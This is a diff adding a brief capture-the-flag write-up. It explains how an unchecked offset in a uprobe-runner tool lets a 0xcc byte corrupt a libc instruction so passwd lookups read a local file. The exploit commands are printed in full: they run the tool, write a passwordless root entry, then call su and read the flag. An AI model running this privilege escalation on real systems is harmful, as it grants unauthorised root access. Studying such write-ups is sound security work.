@@ -1,0 +1,13 @@
+Uprobes insert the byte 0xcc to the offset. 
+The go program doesnt check if it the given offset is in instruction offsets, thus it is possible to insert 0xcc into the middle of instructions.
+
+The easiest way to exploit this is to modify the lea instruction used to open the /etc/passwd file in libc.
+
+Change the lea to load a pointer to a string that doesnt start with / then write our own passwd file.
+
+Use su to switch user to root.
+
+uprobe-runner /lib/libc.so.6 0x141f35 &
+echo root::0:0:root:/root:/bin/sh > services
+su
+cat /flag
